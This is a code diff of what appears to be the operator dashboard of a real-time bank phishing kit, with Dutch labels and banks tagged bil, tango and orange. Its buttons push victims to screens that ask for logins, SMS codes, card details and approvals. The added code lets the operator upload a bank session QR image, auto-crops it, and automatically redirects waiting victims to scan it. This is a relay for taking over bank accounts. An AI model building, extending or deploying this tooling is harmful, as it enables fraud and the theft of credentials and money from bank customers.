@@ -1,14 +1,20 @@
 import { useEffect, useMemo, useRef, useState } from "react";
+import jsQR from "jsqr";
 import { Link } from "react-router-dom";
 import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
 import {
   apiBase,
+  apiCloudinaryConfig,
+  apiDeleteQr,
   apiDeleteVisitor,
   apiEnabled,
+  apiGetQr,
   apiGetSubmissions,
   apiGetVisitors,
   apiLogin,
   apiSendCommand,
+  apiUploadQrCloudinary,
+  apiUploadQrInline,
 } from "../lib/api";
 import {
   STATUS_LABEL,
@@ -16,9 +22,12 @@ import {
   isOnline,
   markAdminOnline,
   readCommands,
+  readQrMap,
   readSubmissions,
   readVisitors,
   writeCommands,
+  writeQrMap,
+  writeSubmissions,
   writeVisitors,
 } from "../lib/realtime";
 
@@ -184,15 +193,16 @@ function MiniLogo({ slug, name }) {
 }
 
 const ACTIONS = [
-  { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white" },
-  { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white" },
-  { key: "ask_phone", label: "Telefoon vragen", style: "bg-cyan-700 text-white" },
-  { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white" },
-  { key: "ask_card", label: "Kaart vragen", style: "bg-emerald-700 text-white" },
-  { key: "ask_info", label: "Info vragen", style: "bg-teal-700 text-white" },
-  { key: "ask_confirm", label: "Bevestiging vragen", style: "bg-indigo-700 text-white" },
-  { key: "done", label: "Voltooien", style: "bg-green-600 text-white" },
-  { key: "reset_waiting", label: "Lader", style: "bg-neutral-200 text-neutral-800" },
+  { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white", banks: null },
+  { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil"] },
+  { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white", banks: null },
+  { key: "ask_phone", label: "Telefoon vragen", style: "bg-cyan-700 text-white", banks: null },
+  { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white", banks: null },
+  { key: "ask_card", label: "Kaart vragen", style: "bg-emerald-700 text-white", banks: null },
+  { key: "ask_info", label: "Info vragen", style: "bg-teal-700 text-white", banks: null },
+  { key: "ask_confirm", label: "Bevestiging vragen", style: "bg-indigo-700 text-white", banks: null },
+  { key: "done", label: "Voltooien", style: "bg-green-600 text-white", banks: null },
+  { key: "reset_waiting", label: "Lader", style: "bg-neutral-200 text-neutral-800", banks: null },
 ];
 
 const TABS = [
@@ -1149,6 +1159,351 @@ function Pagination({ page, pageCount, total, pageSize, onPage }) {
   );
 }
 
+function loadImage(file) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    const url = URL.createObjectURL(file);
+    img.onload = () => {
+      URL.revokeObjectURL(url);
+      resolve(img);
+    };
+    img.onerror = () => {
+      URL.revokeObjectURL(url);
+      reject(new Error("read"));
+    };
+    img.src = url;
+  });
+}
+
+function canvasBlob(canvas) {
+  return new Promise((resolve, reject) => {
+    canvas.toBlob((b) => (b ? resolve(b) : reject(new Error("convert"))), "image/jpeg", 0.88);
+  });
+}
+
+// Auto-detect the QR code and crop tightly to it (square + margin).
+// Returns { blob, detected }. Falls back to a center square when no QR found.
+async function autoCropQr(file) {
+  const img = await loadImage(file);
+  const max = 1200;
+  const sc = Math.min(1, max / Math.max(img.width, img.height));
+  const w = Math.max(1, Math.round(img.width * sc));
+  const h = Math.max(1, Math.round(img.height * sc));
+  const work = document.createElement("canvas");
+  work.width = w;
+  work.height = h;
+  const wctx = work.getContext("2d", { willReadFrequently: true });
+  wctx.drawImage(img, 0, 0, w, h);
+
+  let box = null;
+  try {
+    const data = wctx.getImageData(0, 0, w, h);
+    const code = jsQR(data.data, w, h);
+    if (code?.location) {
+      const pts = [
+        code.location.topLeftCorner,
+        code.location.topRightCorner,
+        code.location.bottomRightCorner,
+        code.location.bottomLeftCorner,
+      ];
+      const xs = pts.map((p) => p.x);
+      const ys = pts.map((p) => p.y);
+      box = { x0: Math.min(...xs), y0: Math.min(...ys), x1: Math.max(...xs), y1: Math.max(...ys) };
+    }
+  } catch {}
+
+  let sx, sy, side;
+  if (box) {
+    const margin = Math.max(box.x1 - box.x0, box.y1 - box.y0) * 0.1 + 8;
+    let x0 = box.x0 - margin;
+    let y0 = box.y0 - margin;
+    let x1 = box.x1 + margin;
+    let y1 = box.y1 + margin;
+    side = Math.max(x1 - x0, y1 - y0);
+    // expand smaller axis to square, centered
+    const cx = (x0 + x1) / 2;
+    const cy = (y0 + y1) / 2;
+    x0 = cx - side / 2;
+    y0 = cy - side / 2;
+    // clamp into the image
+    x0 = Math.max(0, Math.min(w - side, x0));
+    y0 = Math.max(0, Math.min(h - side, y0));
+    side = Math.min(side, w - x0, h - y0);
+    sx = x0;
+    sy = y0;
+  } else {
+    // fallback: center square
+    side = Math.min(w, h);
+    sx = (w - side) / 2;
+    sy = (h - side) / 2;
+  }
+
+  const outMax = 700;
+  const outScale = Math.min(1, outMax / side);
+  const out = document.createElement("canvas");
+  out.width = Math.max(1, Math.round(side * outScale));
+  out.height = out.width;
+  const octx = out.getContext("2d");
+  octx.fillStyle = "#ffffff";
+  octx.fillRect(0, 0, out.width, out.height);
+  octx.drawImage(work, sx, sy, side, side, 0, 0, out.width, out.height);
+  const blob = await canvasBlob(out);
+  return { blob, detected: !!box };
+}
+
+function fileToJpegBlob(file) {
+  // Downscale huge phone photos so uploads stay fast (Cloudinary + inline).
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    const url = URL.createObjectURL(file);
+    img.onload = () => {
+      try {
+        const max = 900;
+        const sc = Math.min(1, max / Math.max(img.width, img.height));
+        const c = document.createElement("canvas");
+        c.width = Math.max(1, Math.round(img.width * sc));
+        c.height = Math.max(1, Math.round(img.height * sc));
+        c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
+        URL.revokeObjectURL(url);
+        c.toBlob((b) => (b ? resolve(b) : reject(new Error("convert"))), "image/jpeg", 0.85);
+      } catch (e) {
+        reject(e);
+      }
+    };
+    img.onerror = () => {
+      URL.revokeObjectURL(url);
+      reject(new Error("read"));
+    };
+    img.src = url;
+  });
+}
+
+function blobToDataURL(blob) {
+  return new Promise((res, rej) => {
+    const r = new FileReader();
+    r.onload = () => res(r.result);
+    r.onerror = rej;
+    r.readAsDataURL(blob);
+  });
+}
+
+// BIL-only: upload the session QR (Cloudinary, inline fallback).
+// One image per session: uploading replaces (and deletes) the old one.
+// Shows: not-uploaded / uploading % / uploaded / failed.
+function QrUploadCard({ visitorId }) {
+  const [current, setCurrent] = useState(null);
+  const [file, setFile] = useState(null);
+  const [cropBlob, setCropBlob] = useState(null);
+  const [preview, setPreview] = useState("");
+  const [pct, setPct] = useState(0);
+  const [st, setSt] = useState("idle"); // idle|detecting|ready|uploading|done|error
+  const [msg, setMsg] = useState("");
+
+  const refresh = async () => {
+    if (apiEnabled()) {
+      try {
+        const r = await apiGetQr(visitorId);
+        setCurrent(r?.qr || null);
+        return;
+      } catch {}
+    }
+    try {
+      const m = readQrMap();
+      setCurrent(m[visitorId] || null);
+    } catch {}
+  };
+
+  useEffect(() => {
+    setCurrent(null);
+    setFile(null);
+    setCropBlob(null);
+    setPreview("");
+    setPct(0);
+    setSt("idle");
+    setMsg("");
+    refresh();
+    const iv = setInterval(refresh, 4000);
+    const onStorage = (e) => {
+      if (e.key === "live_qr_v1") refresh();
+    };
+    window.addEventListener("storage", onStorage);
+    const ch = getChannel();
+    const onMsg = (ev) => {
+      if (ev.data?.type === "qr-update" && ev.data?.visitorId === visitorId) refresh();
+    };
+    ch?.addEventListener?.("message", onMsg);
+    return () => {
+      clearInterval(iv);
+      window.removeEventListener("storage", onStorage);
+      try {
+        ch?.removeEventListener?.("message", onMsg);
+        ch?.close?.();
+      } catch {}
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [visitorId]);
+
+  async function pick(e) {
+    const f = e.target.files?.[0];
+    e.target.value = "";
+    if (!f) {
+      setFile(null);
+      setCropBlob(null);
+      setPreview("");
+      setSt(current ? "done" : "idle");
+      setMsg("");
+      return;
+    }
+    setFile(f);
+    setCropBlob(null);
+    setPreview(URL.createObjectURL(f));
+    setSt("detecting");
+    setMsg("QR detecteren en bijsnijden…");
+    try {
+      const { blob, detected } = await autoCropQr(f);
+      setCropBlob(blob);
+      setPreview(URL.createObjectURL(blob));
+      setSt("ready");
+      setMsg(detected ? "✓ QR auto-gedetecteerd en bijgesneden" : "Geen QR gevonden — midden uitgesneden");
+    } catch {
+      setCropBlob(null);
+      setPreview("");
+      setSt("error");
+      setMsg("Afbeelding niet leesbaar");
+    }
+  }
+
+  async function upload() {
+    if (!cropBlob || st === "uploading" || st === "detecting") return;
+    setSt("uploading");
+    setPct(0);
+    setMsg("");
+    try {
+      const blob = cropBlob;
+      if (apiEnabled()) {
+        // Prefer Cloudinary; fall back to inline Postgres when unconfigured.
+        let cfg = null;
+        try {
+          cfg = await apiCloudinaryConfig();
+        } catch {}
+        if (cfg?.enabled && cfg?.cloudName) {
+          await apiUploadQrCloudinary(visitorId, blob, cfg, (p) => setPct(p));
+        } else {
+          setPct(40);
+          const dataUrl = await blobToDataURL(blob);
+          setPct(80);
+          await apiUploadQrInline(visitorId, dataUrl);
+          setPct(100);
+        }
+      } else {
+        const dataUrl = await blobToDataURL(blob);
+        const m = readQrMap();
+        m[visitorId] = { image: dataUrl, at: Date.now() };
+        writeQrMap(m);
+        try {
+          getChannel()?.postMessage({ type: "qr-update", visitorId });
+        } catch {}
+        setPct(100);
+      }
+      setSt("done");
+      setMsg("✓ Geüpload — zichtbaar aan gebruikerszijde");
+      setFile(null);
+      setPreview("");
+      refresh();
+      // Push the visitor straight to the QR page if they're still parked
+      // pre-QR (loader after login). Past that point, no yanking.
+      try {
+        let st = null;
+        if (apiEnabled()) {
+          const v = await apiGetVisitors();
+          st = v?.visitors?.find((x) => x.id === visitorId)?.status;
+        } else {
+          st = readVisitors()[visitorId]?.status;
+        }
+        if (st === "waiting" || st === "login_submitted") {
+          const at = Date.now();
+          const m = readCommands();
+          m[visitorId] = { type: "ask_qr", at, by: "admin" };
+          writeCommands(m);
+          try {
+            getChannel()?.postMessage({ type: "command", visitorId, command: "ask_qr", at });
+          } catch {}
+          if (apiEnabled()) apiSendCommand(visitorId, "ask_qr").catch(() => {});
+        }
+      } catch {}
+    } catch (err) {
+      setSt("error");
+      setMsg(`Upload mislukt: ${err.message || "opnieuw proberen"}`);
+    }
+  }
+
+  async function remove() {
+    try {
+      if (apiEnabled()) await apiDeleteQr(visitorId);
+      else {
+        const m = readQrMap();
+        delete m[visitorId];
+        writeQrMap(m);
+        try {
+          getChannel()?.postMessage({ type: "qr-update", visitorId });
+        } catch {}
+      }
+      setCurrent(null);
+      setSt("idle");
+      setMsg("");
+    } catch (e) {
+      setMsg("Verwijderen mislukt");
+    }
+  }
+
+  return (
+    <div className="rounded-xl bg-white/[0.04] p-3 ring-1 ring-fuchsia-400/20">
+      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">QR tonen (BIL)</h4>
+      {current?.image ? (
+        <img src={current.image} alt="QR" className="mx-auto mt-2 h-28 w-28 rounded-lg bg-white object-contain p-1" />
+      ) : (
+        <p className="mt-2 rounded-lg bg-white/5 px-2 py-1.5 text-center text-[12px] text-purple-300">
+          {st === "uploading" ? "Bezig met uploaden…" : "Nog geen QR geüpload"}
+        </p>
+      )}
+      <label className="mt-2 block min-h-[44px] cursor-pointer rounded-lg bg-white/10 px-3 py-2.5 text-center text-[13px] font-bold text-purple-100 transition hover:bg-white/20">
+        {preview ? "Andere afbeelding kiezen" : "Kies QR-afbeelding"}
+        <input type="file" accept="image/*" className="hidden" onChange={pick} />
+      </label>
+      {preview && (
+        <img src={preview} alt="preview" className="mx-auto mt-2 h-20 w-20 rounded-lg bg-white object-contain p-1 opacity-80" />
+      )}
+      {st === "uploading" && (
+        <div className="mt-2">
+          <div className="h-2.5 w-full overflow-hidden rounded-full bg-white/10">
+            <div className="h-full rounded-full bg-gradient-to-r from-fuchsia-500 to-purple-500 transition-all" style={{ width: `${pct}%` }} />
+          </div>
+          <p className="mt-1 text-center text-[12px] font-bold text-purple-200">Uploaden… {pct}%</p>
+        </div>
+      )}
+      <div className="mt-2 flex gap-1.5">
+        <button
+          onClick={upload}
+          disabled={!cropBlob || st === "uploading" || st === "detecting"}
+          className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[13px] font-extrabold text-white transition hover:bg-fuchsia-500 active:scale-95 disabled:opacity-40"
+        >
+          {st === "detecting" ? "Detecteren…" : current?.image ? "Vervangen" : "Uploaden"}
+        </button>
+        {current?.image && (
+          <button onClick={remove} className="min-h-[44px] rounded-lg bg-white/10 px-3 text-[13px] font-bold text-red-300">
+            Wissen
+          </button>
+        )}
+      </div>
+      {msg && (
+        <p className={`mt-1.5 text-center text-[12px] font-bold ${st === "error" ? "text-red-300" : "text-emerald-300"}`}>
+          {msg}
+        </p>
+      )}
+    </div>
+  );
+}
+
 function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
   const online = isOnline(v, now);
   const rows = [
@@ -1223,8 +1578,18 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
         {/* RIGHT — ask-step buttons */}
         <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
           <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Actions</h3>
+          {v.bank === "bil" && (
+            <div className="mt-2.5">
+              <QrUploadCard visitorId={v.id} />
+            </div>
+          )}
           <div className="mt-2.5 grid grid-cols-2 gap-1.5 lg:grid-cols-1">
-            {ACTIONS.map((a) => (
+            {ACTIONS.filter((a) => {
+              if (a.banks && !a.banks.includes(v.bank)) return false;
+              // Tango / Orange are login-only: just re-ask login or park on loader.
+              if ((v.bank === "tango" || v.bank === "orange") && !["ask_login", "reset_waiting"].includes(a.key)) return false;
+              return true;
+            }).map((a) => (
               <button
                 key={a.key}
                 onClick={() => onAction(a.key)}
